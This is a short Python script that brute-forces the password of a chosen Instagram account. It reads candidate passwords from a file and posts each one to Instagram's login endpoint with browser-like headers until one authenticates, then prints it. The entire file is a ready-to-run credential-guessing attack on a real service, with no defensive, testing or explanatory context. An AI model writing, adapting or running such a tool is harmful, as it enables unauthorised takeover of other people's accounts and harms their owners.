import requests

def attempt_login(username, password):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
        'X-CSRFToken': 'fetch_this_from_browser_cookie',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}'
    }
    
    session = requests.Session()
    response = session.post(login_url, data=payload, headers=headers)
    
    try:
        return response.json()
    except requests.exceptions.JSONDecodeError:
        print(f"Failed to decode JSON response: {response.text}")
        return None

def main():
    username = input("Enter Instagram username: ")
    password_file = input("Enter path to password file: ")
    
    with open(password_file, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        response = attempt_login(username, password)
        if response:
            if response.get('authenticated'):
                print(f"Success! Password found: {password}")
                break
            else:
                print(f"Attempted password {password} failed. Response: {response}")
        else:
            print(f"Failed to get a valid response for password {password}")

if __name__ == "__main__":
    main()
